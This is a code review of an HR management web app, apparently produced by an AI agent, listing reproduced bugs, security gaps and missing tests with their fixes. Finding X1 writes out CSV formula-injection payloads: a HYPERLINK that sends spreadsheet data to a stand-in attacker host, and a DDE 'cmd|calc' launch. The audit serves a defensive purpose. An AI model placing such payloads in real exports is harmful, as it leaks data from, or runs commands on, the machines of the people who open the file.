# Code review: HRM System

Date: 2026-10-08. Scope: the whole `hrm-system` app. No source files were changed.

How each finding was checked: every row below was reproduced with a command, a failing probe test, or a concrete input and the output it produced. Anything that could not be shown that way is listed under "Not reported" at the end. The probe tests ran against the real app (in-memory SQLite, fake data only, nothing taken from the real workbooks). They sit outside the repo; see "Rerunning the probes".

Severity:
- **blocker**: stops a release or destroys data with no warning on a normal path.
- **major**: wrong data, a broken documented guarantee, or a security gap on a reachable path.
- **minor**: real but narrow, or only a test or contract gap.

**Result: 0 blockers, 15 major, 26 minor (41 findings).**

> **Fix status (2026-10-08, same day):** all 41 findings are fixed, each with a regression test. The suite went from 35 to 90 tests and passes (`OK (90 tests, 590 assertions)`), including on a checkout with no `.env`. `tsc` is clean and `npm run build` works. The new test files are `ImportRegressionTest`, `XlsxReaderEdgeCasesTest`, `WorkflowRegressionTest`, `HrRulesRegressionTest`, `SecurityRegressionTest`, `RouteAccessTest` and `CoverageTest`.
> Notes:
> - **S2:** `composer.lock` now exists, generated with PHP 8.3. Commit it.
> - **F2:** new checklist keys are unique across lists, and document columns always show the document value. A clash created *before* the fix would still need id-keyed grid values to separate fully.
> - **R2:** choosing "Extend" now requires a later end date, and extended probations count as open in the overdue and ending-soon checks.
> - **X1:** cells starting with `= + - @` are exported with a leading `'`. This includes phone numbers like `'+92…`, which Excel shows normally.
>
> The findings table below describes the code as it was reviewed.

---

## 1. Build and test commands

| Step | Result | Detail |
|---|---|---|
| `composer install` | **Fails with the documented setup** | The machine's PHP is 8.2.12, but `composer.json` needs `php ^8.3`, which the README also states. That is an environment issue, not a code defect. With a portable PHP 8.3.35 it installed cleanly. There is **no `composer.lock`** in the project (finding S2). |
| `composer test` | **Fails on a fresh checkout**: 17 errors, `MissingAppKeyException` | There is no `.env` and `phpunit.xml` sets no `APP_KEY` (finding S1). With a test key passed as an environment variable: `OK (35 tests, 213 assertions)`. |
| `npx tsc --noEmit` | Pass (exit 0) | The first `npm ci` failed on a network `ECONNRESET`, so `npx` fetched the unrelated `tsc@2.0.4` package. After a successful `npm ci` the check was clean. |
| `npm run build` | Pass | Built in 7.75 s. One warning: the 643 kB JS chunk is over 500 kB. That isn't a defect. |

## 2. Does the code follow CLAUDE.md and ARCHITECTURE.md?

| Rule | Holds? | Evidence |
|---|---|---|
| 1. Status logic only in HrRules, StatusBoard and config | **Partly** | No React page computes a status. The probation "overdue" and "ending soon" checks are re-implemented in `DashboardController` and `OnboardingController` (R6). |
| 2. Link by `employees.id`, never by name | Yes | Outside the importer, `full_name` and `name` are used only in search filters (`Employee.php:89`, `ControlledDocumentController.php:24`). |
| 3. Every write goes through `validate()` and `can:` middleware | Yes for permissions; **no** for validation completeness | A probe walked all 42 write and admin routes as viewer and HR: every one returned 403. `PUT /account` has no `can:` middleware, by design (own account only; the probe confirmed role and email can't be changed). Several `validate()` rules let wrong data in (X2–X6, R4). |
| 4. Every HR model uses `LogsActivity` | **No** | `ProbationPlanItem`, `ProbationCheckin` and `Company` don't use it. Plan edits are therefore not recorded (L1). |
| 5. No real HR data in the repo | Yes | No xlsx, csv or log files ship in the repo. `storage/logs/laravel.log` was created by this review's test runs, holds only fake data, and is gitignored. |
| 6. Strict mode on; migration defaults mirrored in `$attributes` | **Partly** | Strict mode is on, and no lazy-loading errors appeared in any probe. Three models lack `$attributes` for their migration defaults (L2). |
| 7. Props contract: dates `Y-m-d`, timestamps ISO 8601 | **Partly** | The props of all 15 pages were captured and match `types/index.ts`, with two exceptions (F3, F5). |
| 8. Checklist items are data; `REQUIRED_KEYS` can't be removed | Yes | A probe tried to switch off all 9 required keys through Settings: every attempt was refused. |
| ARCH §4: state transitions | **No** | An exited employee can go back to offboarding and then to active (R4). "Extend" does not move the end date (R2). |
| ARCH §5: computed statuses | Yes | The formulas match. Dashboard, grids and CSV agree on the same data (`compliant=2`, `grid complete=2`, `csv Complete=2`). |
| ARCH §6: skip if unchanged, log old and new value | Yes, but untested (T5, T6) | |
| ARCH §7: import pipeline | **Partly** | See I1–I11. The report location, the transaction, the refusal to re-run without `--fresh`, and case-insensitive value mapping all work. |
| Security notes | Yes | Login is rate limited (5 tries per minute per email and IP). The session is regenerated on login. Switched-off users are logged out, even with a remember-me cookie. There is no sign-up route (`POST /register` gives 404). `javascript:` and `data:` URLs are rejected. Import reports are saved under `storage/app/private`. |

---

## 3. Findings

### Setup

| # | Sev | File:line | What goes wrong | Proof | Suggested fix |
|---|---|---|---|---|---|
| S1 | minor | `phpunit.xml:20-35` | `composer test`, the definition-of-done command, fails on a fresh checkout. | With no `.env`, `composer test` gives `Tests: 35, Errors: 17`, each `MissingAppKeyException`. `APP_KEY=base64:… php vendor/bin/phpunit` gives `OK (35 tests)`. | Add `<env name="APP_KEY" value="base64:<fixed test key>"/>` to `phpunit.xml`. |
| S2 | minor | `composer.json` (no `composer.lock`) | Each install resolves the newest packages, not the versions the README says were verified (framework 13.35.0, inertia 3.5.1). The lock file isn't gitignored; it just isn't committed. | `composer install` printed `No composer.lock file present. Updating dependencies to latest instead of installing from lock file.` | Commit `composer.lock`. |

### Status rules and state transitions

| # | Sev | File:line | What goes wrong | Proof | Suggested fix |
|---|---|---|---|---|---|
| R1 | major | `app/Http/Controllers/ProbationPlanController.php:84`, `:145`; `app/Http/Controllers/OnboardingController.php:125` | `onboarding()->firstOrCreate([])` creates the onboarding row with `probation_end_date = NULL` and `probation_result = NULL`. The person shows as "Not tracked" and is never flagged overdue or ending soon. ARCH §4 says a new hire gets Pending and start + 90. | Employee with start 2026-07-01 and no onboarding row. `POST /employees/{id}/plan` gives `end=NULL result=NULL`; `PUT /onboarding/{id} {cohort:'A'}` gives the same. Probes `test_p1`, `test_p1b` fail: `null is identical to '2026-09-29'`. | Create the row with `['probation_end_date' => HrRules::probationEnd($e->start_date), 'probation_result' => 'Pending']`. Put that in one helper used by every entry point. |
| R2 | major | `app/Http/Controllers/OnboardingController.php:122`; `app/Services/HrRules.php:121`; `app/Http/Controllers/DashboardController.php:58` | Setting the result to "Extend" leaves the end date alone, and only `'Pending'` is ever flagged. An extended probation drops out of every alert. ARCH §4: "Pending → Extend : move the end date". | End 2026-04-01, Pending, then `PUT /onboarding/{id} {probation_result:'Extend'}`. Result: `end=2026-04-01 result=Extend`, dashboard `overdue=0`. Probe `test_p2` fails. | When the result becomes Extend, require a new later `probation_end_date`. Treat Extend like Pending in `isProbationOverdue` and in "ending soon". |
| R3 | major | `app/Http/Controllers/OffboardingController.php:131`; `app/Services/HrRules.php:23` | The "exited only when every clearance item is Done or Not Required" guard looks only at active items. `REQUIRED_KEYS['offboarding']` is `[]`, so an admin can switch off clearance items and then complete the case with items still Pending. | `assets_returned` = Pending. Every clearance item switched off via `PUT /settings/checklists/{id}` (accepted), then `POST /offboarding/{id}/complete`. Result: `status=exited`. Probe `test_p4` fails. | In `complete()`, also block on not-done entries for inactive clearance items, and refuse when there are zero clearance items. Or add the core clearance keys to `REQUIRED_KEYS['offboarding']`. |
| R4 | major | `app/Http/Controllers/OffboardingController.php:67`, `:79`, `:158` | `employee_id` is checked only with `exists`. An **exited** employee can be offboarded again, which sets them to `offboarding`, and cancelling then makes them `active`. ARCH §4 says exited is final. Once back, they count as current and as overdue. Three reviewers found this independently. | Exited employee, `POST /offboarding {employee_id}`: status becomes `offboarding`, dashboard `totals.current=1`, `overdue=1`. Then `POST /offboarding/{id}/cancel`: status becomes `active`. Probes `test_exited_employee_cannot_be_put_back_into_offboarding` (`-'exited' +'offboarding'`) and `…reactivated_by_start_then_cancel` (`-'exited' +'active'`) fail. | `Rule::exists('employees','id')->where('status','active')->withoutTrashed()`. |
| R5 | minor | `app/Http/Controllers/DashboardController.php:117` | The offboarding tile counts cases whose employee was soft-deleted, while every other tile excludes them. | Start an offboarding, then `DELETE /employees/{id}`. Result: `totals.offboarding=1`, `totals.current=0`. | `->whereHas('employee')`, or cancel open cases in `EmployeeController::destroy`. |
| R6 | minor | `app/Http/Controllers/DashboardController.php:58-64`; `app/Http/Controllers/OnboardingController.php:73` | Breaks rule 1: the overdue and "ending soon" checks are written out in two controllers instead of calling `HrRules`. A fix to R2 made only in HrRules would not reach these screens. | `DashboardController.php:58`: `if ($o->probation_result === 'Pending' && $end)`. `OnboardingController.php:73`: `'ending' => $o->probation_result === 'Pending' && …`. Neither line calls `HrRules`. | Add `HrRules::isProbationEndingSoon()` and use it, together with `isProbationOverdue`, in both controllers. |

### Security and validation

| # | Sev | File:line | What goes wrong | Proof | Suggested fix |
|---|---|---|---|---|---|
| X1 | major | `app/Http/Controllers/ExportController.php:32` | CSV formula injection. Cell values are written exactly as stored, and the file opens in Excel (UTF-8 BOM). A value starting with `= + - @` runs as a formula on the viewer's machine. | HR POSTs an employee with `full_name='=HYPERLINK("http://evil.example/?x="&A2,"click")'`, `role_title='@SUM(1+1)'` and `phone='+1+cmd\|calc!A0'`. A viewer's `GET /export/employees` contains `BCC-001,"=HYPERLINK(""http://evil.example/?x=""&A2,""click"")",BCC,,,@SUM(1+1),…,+1+cmd\|calc!A0`. | Put `'` in front of any string cell starting with `=`, `+`, `-`, `@`, tab or CR before `fputcsv`. |
| X2 | major | `app/Http/Controllers/EmployeeController.php:233` | The "department must belong to the company" check runs only when `company_id` is in the request. An update that leaves it out can give a BCC employee an Emerge department. | `PUT /employees/{id}` with `full_name` and `department_id=<Emerge dept>`, no `company_id`. Result: `302`, `company_id=1 (BCC)`, `department_id=2 (Emerge)`, no errors. | Compare against `$request->integer('company_id') ?: $employee?->company_id`. |
| X3 | major | `app/Http/Controllers/ChecklistEntryController.php:32` | `exists:employees,id` ignores soft deletes, so bulk update writes checklist values for deleted employees. | Bulk POST with a soft-deleted employee's id. Result: `302`, `errors=null`, `entries for deleted=1`. | `Rule::exists('employees','id')->withoutTrashed()`. |
| X4 | minor | `app/Http/Controllers/EmployeeController.php:213` | A soft-deleted employee can be set as someone's manager. | `PUT /employees/{id} {manager_id:<trashed>}`. Result: `302`, `manager_id=1`, no errors. | `Rule::exists(...)->withoutTrashed()`. |
| X5 | minor | `app/Http/Controllers/ChecklistEntryController.php:20` (and `bulk`) | Checklist items switched off in Settings still accept values. | `appointment_letter` switched off, then `PUT /checklist/{e}/{item} {status:'Yes'}`. Result: `302`, entry saved as `Yes`. | `abort_unless($item->is_active, 404)`. Add `->where('is_active', true)` to bulk's `exists`. |
| X6 | minor | `app/Http/Controllers/Settings/UserController.php:31`, `:35` | `unique:users,email` checks the email as typed, but it is saved lowercased, so an email differing only in case passes validation and then hits the DB constraint. | `dup@test.local` exists. `POST /settings/users {email:'DUP@test.local'}` returns **500**: `UNIQUE constraint failed: users.email`. | Lowercase the email before `validate()`, e.g. with `$request->merge(...)`. |

### Importer (`hr:import`)

| # | Sev | File:line | What goes wrong | Proof | Suggested fix |
|---|---|---|---|---|---|
| I1 | major | `app/Services/Import/HrWorkbookImporter.php:212-220` | A blank-ID row gets `nextEmployeeCode()`. A later row with ID `1` maps to the same code, and `updateOrCreate` **overwrites the first person**. The first person's later rows then become UNASSIGNED records. | BCC sheet rows `['' => 'Alice Blank']`, `[1 => 'Bob One']`. Employees: `{"BCC-001":"Bob One"}`, while stats say `employees_from_department_lists=2`. Probe `test_i1` fails: `1 is identical to 2`. | Assign explicit IDs in a first pass and blank-ID codes after them. Use `create()` in a fresh run and report a collision instead of overwriting. |
| I2 | major | `app/Services/Import/HrWorkbookImporter.php:220` | Two rows with the same ID: the second silently replaces the first, and the report says nothing. | Two rows with ID 7 (Carol, Dave). Result: `{"BCC-007":"Dave Seven"}`, report `[]`. Probe `test_i2` fails. | Track the codes seen in the run, and log `duplicate_id` on a repeat. |
| I3 | major | `app/Services/Import/HrWorkbookImporter.php:510`; `app/Services/Import/NameMatcher.php:64` | The ambiguous-row report shows the full name (`Ali Raza (night shift)`) and tells HR to add it to `aliases.csv`. The lookup uses the name with the bracket stripped, so the advised alias never matches. | Second run with alias `{"Ali Raza (night shift)":"BCC-002"}`: still `ambiguous Ali Raza (night shift)`. Probe `test_i3` fails. | Look up the alias on the full cleaned name first, then on the bare name. |
| I4 | major | `app/Services/Import/HrWorkbookImporter.php:648-653` (used at `:272`, `:290`, `:347`) | `date()` accepts only `YYYY-MM-DD`. A start date typed as text (`15/01/2024`) silently becomes null, so no probation end is computed. ARCH says every invalid value is reported. | Start date cell `15/01/2024` (text). Result: `start=null, prob_end=null`; the report holds only `matched:`. Probe `test_i5` fails. | Parse the common text formats (`d/m/Y`, `d-M-Y`), else log `invalid_value`. |
| I5 | minor | `app/Services/Import/HrWorkbookImporter.php:523`; `app/Services/Import/NameMatcher.php:64` | Aliases are keyed by name only, so two onboarding people with the same name can't be split. With the advised alias, both rows go to one person and the second person's values are dropped. | Alias `Ali Raza => BCC-001`. Report: `2 matched BCC-001`, `3 matched BCC-001`, `3 duplicate_conflict Email created: kept "Yes", ignored "No"`. BCC-002 has no onboarding row. Probe `test_i4` fails. | Allow aliases keyed by `sheet + row`, or by name + hint. |
| I6 | minor | `app/Services/Import/HrWorkbookImporter.php:279-283` | The manager is linked on **any** single-candidate match, including fuzzy ones, with no `needs_review` flag and no report line. | List "Hira Batool", Manager_Name "Hina Batool". Result: `manager_id=1`, `needs_review=[]`, nothing in the report. Probe `test_i6` fails. | Link only on alias, exact, normalized or spelling matches; otherwise log it and flag the record. |
| I7 | minor | `app/Services/Import/NameMatcher.php:64-67` | An alias pointing at a code that doesn't exist silently creates a new UNASSIGNED employee. | Alias `Gina R => BCC-01` (typo). The only report line is `created none UNASSIGNED-001`. Probe `test_i7` fails. | Return `bad_alias`, report it, and create nothing. |
| I8 | minor | `app/Support/Xlsx/XlsxReader.php:105-112` | The 1904 date system is ignored, so dates come out 4 years and 1 day early. | `<workbookPr date1904="1"/>`, serial 43831 in a date style. Read as `2020-01-01`; Excel shows `2024-01-02`. | Read `workbookPr/@date1904` and add 1462 days. |
| I9 | minor | `app/Support/Xlsx/XlsxReader.php:74-77` | Cells without an `r=` attribute (valid OOXML, written by some tools) are dropped, so the sheet reads as empty. | Sheet of `<c t="inlineStr">` with no `r`. Read as `array()`. | Track a running column and row index when `r` is missing. |
| I10 | minor | `app/Support/Xlsx/XlsxReader.php:72` | A sheet using a prefixed main namespace (`<x:worksheet>`) reads as empty, with no error. | Prefixed sheet. Read as `array()`. | Use `->children(self::NS_MAIN)`. |
| I11 | minor | `app/Support/Xlsx/XlsxReader.php:180`, `:95-101` | Built-in time formats 18–21 and 45–47 are treated as dates. `t="d"` ISO cells are returned raw, which then fails the importer's date regex (I4), so those dates are lost. | Format 20 (h:mm) holding 0.4375: read as `1899-12-30`. `t="d"` cell: read as `2024-01-15T00:00:00`. | Leave time formats out of the date list. For `t="d"`, take `substr($v, 0, 10)`. |

### Frontend and props contract

| # | Sev | File:line | What goes wrong | Proof | Suggested fix |
|---|---|---|---|---|---|
| F1 | major | `resources/js/pages/employees/form.tsx:35` | The default `employment_type ?? 'Full Time'` also applies on **edit**. Any employee with a blank type, which imported records often are, is silently saved as "Full Time" the next time anyone edits them. | The `/employees/{id}/edit` prop has `employment_type: null`. PUTting the exact payload the form builds is accepted; afterwards `employment_type="Full Time"`. | Default only when `employee === null`; otherwise use `employee.employment_type ?? ''`. |
| F2 | major | `app/Http/Controllers/OnboardingController.php:74`; `app/Http/Controllers/Settings/ChecklistItemController.php:51`; `resources/js/components/checklist-grid.tsx:68` | Grid values are keyed by item `key` only, and keys are unique only within one list. An onboarding step with the same key as a legal document overwrites that document's value in the grid. This is plausible: the old tracker had Policy, NDA and NCA columns too. | Admin adds an onboarding step "Policy acknowledgment", which gets key `policy_acknowledgment` (id 34), alongside the document item (id 22). Document set to `Yes`, step set to `No`. `/onboarding` `rows[0].values.policy_acknowledgment = "No"`, so the Legal documents cell shows No. | Key values by item id (or `list:key`) on both the server and the grid. Or reject a key already used in another list in `ChecklistItemController::store`. |
| F3 | minor | `app/Models/Concerns/LogsActivity.php:28` | `getOriginal()` returns a Carbon for date casts, so the History tab shows `start date: 2026-07-01T00:00:00.000000Z → 2026-07-02` (breaks rule 7). | `$e->update(['start_date' => '2026-07-02'])` logs `{"start_date":["2026-07-01T00:00:00.000000Z","2026-07-02"]}`. Probe `DateLogProbeTest` fails. | Use `getRawOriginal($field)`, or format date casts as `Y-m-d` before logging. |
| F4 | minor | `resources/js/pages/dashboard.tsx:64`; `resources/js/lib/format.ts:22-28` | The "N days" label uses the browser clock, while the list a person appears in uses the server's `today`. The page already receives `props.today`. | Node run of `format.ts` at 2026-10-08T20:30Z: `daysFromToday('2026-10-08')` gives 0 in New York and -1 in Karachi. Someone the server lists under "next 7 days" is labelled "ended 1 day ago". | Count days from `props.today`, or send the day count from the server. |
| F5 | minor | `app/Http/Controllers/Settings/UserController.php:22` | The timestamp `created_at` is sent as a date (breaks rule 7). | Captured `/settings/users` props: `"created_at": "2026-10-08"`. | Use `toIso8601String()`, or drop the prop. |

### Rule compliance found while reviewing

| # | Sev | File:line | What goes wrong | Proof | Suggested fix |
|---|---|---|---|---|---|
| L1 | major | `app/Models/ProbationPlanItem.php:9`, `app/Models/ProbationCheckin.php`; `app/Http/Controllers/ProbationPlanController.php:136-141` | Breaks rule 4: plan items and check-ins don't use `LogsActivity`. The controller writes one `ProbationPlan updated` row with `changes: null`, so overwritten manager notes and evaluations, which are probation decision evidence, are lost. | Two `PUT /employees/{id}/plan` calls set one behaviour item to `Meets`/`v1`, then `Needs Improvement`/`v2`. `activity_log` holds two `ProbationPlan updated` rows with `"changes": null`; neither "v1" nor "Meets" appears anywhere. Probe `PlanLoggingProbeTest` fails. | Add `LogsActivity` to `ProbationPlanItem`, `ProbationCheckin` and `Company`, with `activityEmployeeId()` going through the plan. |
| L2 | minor | `app/Models/ProbationPlanItem.php`, `app/Models/ProbationCheckin.php`, `app/Models/Company.php` | Breaks rule 6: migration defaults (`sort_order` 0 at `database/migrations/2026_10_08_000400…:58,74`; `employee_code_digits` 3 at `…000100…:20`) are missing from `$attributes`. | `grep -n 'protected $attributes'` on these three models returns nothing. | Add the `$attributes` arrays. |

### Tests: important behaviour with no test

Each probe below **passes** against the current code, so the behaviour works today but nothing guards it. Each one can be added as-is.

| # | Sev | File:line (untested code) | What's missing | Proof | Suggested fix |
|---|---|---|---|---|---|
| T1 | major | `routes/web.php` (`can:edit-hr` and `can:admin` groups) | ARCH says AccessTest proves "a viewer calling the API directly gets 403". It checks 2 of the 42 write and admin routes. A route added outside a gated group would go unnoticed. | `grep -rn assertForbidden tests/` gives 5 lines, all in `AccessTest.php:54-56,77-78`. Probes that walk every route (`test_viewer_gets_403_on_every_edit_hr_route`, `test_hr_and_viewer_get_403_on_every_admin_route`) pass. | Add both route-walking probes. |
| T2 | minor | `tests/Feature/AccessTest.php:36-42` | `test_switched_off_user_is_logged_out_on_next_request` checks only the redirect and calls `actingAs()` again. It still passes if the middleware never logs the user out. | A probe swaps in a middleware that only redirects: the existing test's steps still pass and `assertAuthenticatedAs($user)` passes. | Drop the second `actingAs`, and add `assertGuest()` and `assertSessionHas('error')`. |
| T3 | minor | `app/Http/Controllers/Auth/LoginController.php:32` | The login rate limit is untested. | `grep -rn "Too many\|RateLimiter" tests/` finds nothing. The probe passes: the 6th try is refused even with the right password. | Add the probe. |
| T4 | minor | `app/Models/Concerns/LogsActivity.php:25-33` | Old and new values in `activity_log` are untested. | `grep -rn "changes" tests/` finds nothing. The probe passes: `changes.status === ['No','Yes']`. | Add the probe. |
| T5 | minor | `app/Http/Controllers/EmployeeController.php:192` | Soft delete and its "deleted" log row are untested. | `grep -rn "trashed\|deleted_at\|SoftDelete" tests/` finds nothing. The probe passes `assertSoftDeleted` and the log check. | Add the probe. |
| T6 | minor | `app/Http/Controllers/ChecklistEntryController.php:57` | "Skip if unchanged" (ARCH §6) is untested. | `grep -rn unchanged tests/` finds nothing. The probe passes: no second log row, and `updated_at` is unchanged. | Add the probe. |
| T7 | minor | `app/Http/Controllers/OffboardingController.php:149-161` | Cancelling an offboarding is untested. | `grep -rn cancel tests/` finds nothing. The probe passes: the employee goes back to active, and a cancelled case can't be completed. | Add the probe, plus the R4 regression tests. |
| T8 | minor | `app/Http/Controllers/ExportController.php:12` | "CSV matches the screens" is untested. The existing test checks only the BOM and one name. | `grep -rn "export/onboarding\|export/employees" tests/` finds nothing. The probe passes: the status columns equal the grid props. | Add the probe. |
| T9 | minor | `app/Http/Controllers/ProbationPlanController.php:151`; `app/Http/Controllers/Settings/ChecklistItemController.php:74` | Only the day30 tick and `nda_signed` are tested; the `checkin_items` mapping and the other 8 required keys aren't. | `grep -rn checkin_items tests/` finds nothing. The day60, day90 and all-9-keys probes pass. | Add the probes. |

---

## 4. Not reported (no proof, or working as documented)

- **A second cell save cancels the first** (`checklist-grid.tsx:70` does not pass `async: true`). This comes from reading the Inertia 3.8 source (`interruptInFlight`, `maxConcurrent: 1`). It was not reproduced in a browser. Worth checking by hand.
- **Fuzzy name matching links different people**, e.g. "Sana Khan" to "Sara Khan" (score 0.889). These links are flagged `needs_review`, which is what ARCH §7 documents. The threshold may still be too loose.
- `.env.example` ships with `APP_DEBUG=true`. Changing a password doesn't end the user's other sessions (there is no `AuthenticateSession`). Check both before deploying. Neither was shown to cause harm here.
- **Timezone:** `config/app.php` falls back to UTC when `.env` is missing; `.env.example` sets Asia/Karachi. There is no `.env`, so no wrong output could be shown.
- **UI copy (rule 9)** was not audited, and no screen was opened in a browser.

## 5. Rerunning the probes

The probe tests live outside the repo, in this review session's scratch directory (`…/scratchpad/{lead,rules,security,importer,frontend,tests}/`). They extend `Tests\TestCase` and use fake data only. From the project directory, with PHP 8.3 on the PATH:

```
APP_KEY=base64:$(php -r 'echo base64_encode(random_bytes(32));') php vendor/bin/phpunit <probe file>
```

The scratch directory is temporary. The input and output in each "Proof" cell above are enough to rebuild any probe.
